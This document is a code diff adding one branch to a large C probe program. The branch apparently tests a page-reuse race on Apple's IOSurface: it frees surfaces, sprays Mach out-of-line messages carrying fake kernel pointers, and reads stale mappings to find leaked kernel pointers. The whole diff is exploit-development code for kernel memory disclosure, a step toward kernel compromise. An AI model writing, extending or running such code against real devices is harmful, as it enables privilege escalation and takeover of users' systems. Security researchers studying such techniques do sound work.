@@ -18522,6 +18522,257 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 245) {
+            rlog("*** rounds=245: Page reuse race + OOL spray through stale mapping ***\n");
+            
+            io_service_t svc245 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            
+            /* Phase 1: Create many IOSurfaces and record their mappings */
+            #define N_SURFS 64
+            void *bases[N_SURFS];
+            mach_vm_address_t hdrstarts[N_SURFS];
+            size_t hdrsizes[N_SURFS];
+            IOSurfaceRef surfs[N_SURFS];
+            
+            rlog("  Creating %d IOSurfaces...\n", N_SURFS);
+            for (int i = 0; i < N_SURFS; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                surfs[i] = IOSurfaceCreate(p);
+                if (surfs[i]) {
+                    IOSurfaceLock(surfs[i], 0, NULL);
+                    bases[i] = IOSurfaceGetBaseAddress(surfs[i]);
+                    /* Write known pattern to detect page reuse */
+                    memset(bases[i], 0xAA + (i & 0xF), 16384);
+                    IOSurfaceUnlock(surfs[i], 0, NULL);
+                    
+                    /* Find header start */
+                    mach_vm_address_t ra = (mach_vm_address_t)bases[i] - 0x10000;
+                    hdrstarts[i] = 0; hdrsizes[i] = 0;
+                    while (ra < (mach_vm_address_t)bases[i]) {
+                        mach_vm_size_t rs = 0;
+                        natural_t depth = 1;
+                        struct vm_region_submap_info_64 ri;
+                        mach_msg_type_number_t rc = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        if (mach_vm_region_recurse(mach_task_self(), &ra, &rs, &depth,
+                            (vm_region_recurse_info_t)&ri, &rc) != 0) break;
+                        if (ri.user_tag == 88 && ri.protection == 1) {
+                            hdrstarts[i] = ra;
+                            hdrsizes[i] = (mach_vm_address_t)bases[i] - ra;
+                        }
+                        ra += rs;
+                    }
+                } else {
+                    bases[i] = NULL;
+                    hdrstarts[i] = 0;
+                }
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            
+            int created = 0;
+            for (int i = 0; i < N_SURFS; i++) if (surfs[i]) created++;
+            rlog("  Created %d surfaces\n", created);
+            
+            /* Phase 2: Free every other surface to create holes */
+            rlog("  Freeing odd-indexed surfaces...\n");
+            for (int i = 1; i < N_SURFS; i += 2) {
+                if (surfs[i]) {
+                    CFRelease(surfs[i]);
+                    surfs[i] = NULL;
+                }
+            }
+            
+            /* Phase 3: Immediately spray Mach OOL messages to reclaim pages */
+            rlog("  Spraying OOL messages...\n");
+            #define N_PORTS 32
+            #define MSGS_PER_PORT 16
+            mach_port_t spray_ports[N_PORTS];
+            for (int i = 0; i < N_PORTS; i++) {
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+                mach_port_insert_right(mach_task_self(), spray_ports[i], spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+            }
+            
+            /* Create OOL data with recognizable pattern + fake pointers */
+            uint8_t ool_data[16384];
+            for (int j = 0; j < 16384; j += 8) {
+                /* Put fake kernel-like addresses to test if they show through mapping */
+                uint64_t fake = 0xFFFFFFF007004000ULL + j;
+                memcpy(ool_data + j, &fake, 8);
+            }
+            
+            for (int p = 0; p < N_PORTS; p++) {
+                for (int m = 0; m < MSGS_PER_PORT; m++) {
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                    msg.hdr.msgh_size = sizeof(msg);
+                    msg.hdr.msgh_remote_port = spray_ports[p];
+                    msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                    msg.body.msgh_descriptor_count = 1;
+                    msg.ool.address = ool_data;
+                    msg.ool.size = 16384;
+                    msg.ool.deallocate = 0;
+                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                    mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+                }
+            }
+            rlog("  Sprayed %d OOL messages\n", N_PORTS * MSGS_PER_PORT);
+            
+            /* Phase 4: Read stale mappings of freed surfaces */
+            rlog("  Scanning stale mappings of freed surfaces...\n");
+            int found_nonzero = 0;
+            for (int i = 1; i < N_SURFS && i < 20; i += 2) {
+                if (!bases[i]) continue;
+                /* Try reading the data pages through stale mapping */
+                volatile uint8_t *p = (volatile uint8_t *)bases[i];
+                int nonzero = 0;
+                uint8_t expected = 0xAA + (i & 0xF);
+                int has_our_pattern = 0;
+                int has_new_data = 0;
+                for (int j = 0; j < 16384; j += 64) {
+                    uint8_t v = p[j];
+                    if (v != 0) nonzero++;
+                    if (v == expected) has_our_pattern++;
+                    else if (v != 0) has_new_data++;
+                }
+                if (nonzero > 0) {
+                    found_nonzero++;
+                    rlog("    surf[%d] data: nonzero=%d our_pat=%d new_data=%d\n",
+                         i, nonzero, has_our_pattern, has_new_data);
+                    /* Dump first few non-zero qwords */
+                    uint64_t *qp = (uint64_t*)bases[i];
+                    int dumped = 0;
+                    for (int j = 0; j < 2048 && dumped < 8; j++) {
+                        if (qp[j] != 0) {
+                            rlog("      +%d: 0x%016llx\n", j*8, (unsigned long long)qp[j]);
+                            dumped++;
+                        }
+                    }
+                }
+                
+                /* Also check header pages */
+                if (hdrstarts[i] && hdrsizes[i] > 0) {
+                    vm_offset_t hdata = 0;
+                    mach_msg_type_number_t hcnt = 0;
+                    kern_return_t hkr = mach_vm_read(mach_task_self(), hdrstarts[i],
+                        hdrsizes[i] > 16384 ? 16384 : hdrsizes[i], &hdata, &hcnt);
+                    if (hkr == 0) {
+                        uint64_t *hp = (uint64_t*)hdata;
+                        int hnonzero = 0;
+                        for (int j = 0; j < (int)(hcnt/8); j++) {
+                            if (hp[j] != 0) hnonzero++;
+                        }
+                        if (hnonzero > 0) {
+                            rlog("    surf[%d] header: %d nonzero qwords\n", i, hnonzero);
+                            int hd = 0;
+                            for (int j = 0; j < (int)(hcnt/8) && hd < 5; j++) {
+                                uint64_t v = hp[j];
+                                if (v != 0) {
+                                    rlog("      hdr+%d: 0x%016llx", j*8, v);
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                        rlog(" ***KPTR***");
+                                    rlog("\n");
+                                    hd++;
+                                }
+                            }
+                        }
+                        mach_vm_deallocate(mach_task_self(), hdata, hcnt);
+                    }
+                }
+            }
+            rlog("  Found %d freed surfaces with non-zero data\n", found_nonzero);
+            
+            /* Phase 5: Also try creating NEW surfaces to see if they reuse freed mapping addresses */
+            rlog("  Creating replacement surfaces...\n");
+            IOSurfaceRef replacements[N_SURFS/2];
+            for (int i = 0; i < N_SURFS/2; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                replacements[i] = IOSurfaceCreate(p);
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            
+            /* Now re-read the stale mappings — do they show NEW surface data? */
+            rlog("  Re-scanning stale mappings after replacement surfaces...\n");
+            int found_replaced = 0;
+            for (int i = 1; i < N_SURFS && i < 20; i += 2) {
+                if (!bases[i]) continue;
+                volatile uint8_t *p = (volatile uint8_t *)bases[i];
+                uint8_t expected = 0xAA + (i & 0xF);
+                int nonzero = 0, has_new = 0;
+                for (int j = 0; j < 16384; j += 64) {
+                    uint8_t v = p[j];
+                    if (v != 0) nonzero++;
+                    if (v != 0 && v != expected) has_new++;
+                }
+                if (has_new > 0) {
+                    found_replaced++;
+                    rlog("    surf[%d] REPLACED: nonzero=%d new=%d\n", i, nonzero, has_new);
+                    uint64_t *qp = (uint64_t*)bases[i];
+                    int dumped = 0;
+                    for (int j = 0; j < 2048 && dumped < 5; j++) {
+                        if (qp[j] != 0) {
+                            rlog("      +%d: 0x%016llx\n", j*8, (unsigned long long)qp[j]);
+                            dumped++;
+                        }
+                    }
+                }
+            }
+            rlog("  Found %d surfaces with replaced data visible\n", found_replaced);
+            
+            /* Cleanup */
+            for (int i = 0; i < N_SURFS; i++) if (surfs[i]) CFRelease(surfs[i]);
+            for (int i = 0; i < N_SURFS/2; i++) if (replacements[i]) CFRelease(replacements[i]);
+            for (int i = 0; i < N_PORTS; i++) {
+                /* Drain messages */
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } rmsg;
+                for (int m = 0; m < MSGS_PER_PORT; m++) {
+                    mach_msg(&rmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rmsg),
+                             spray_ports[i], 0, MACH_PORT_NULL);
+                }
+                mach_port_deallocate(mach_task_self(), spray_ports[i]);
+            }
+            
+            if (svc245) IOObjectRelease(svc245);
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
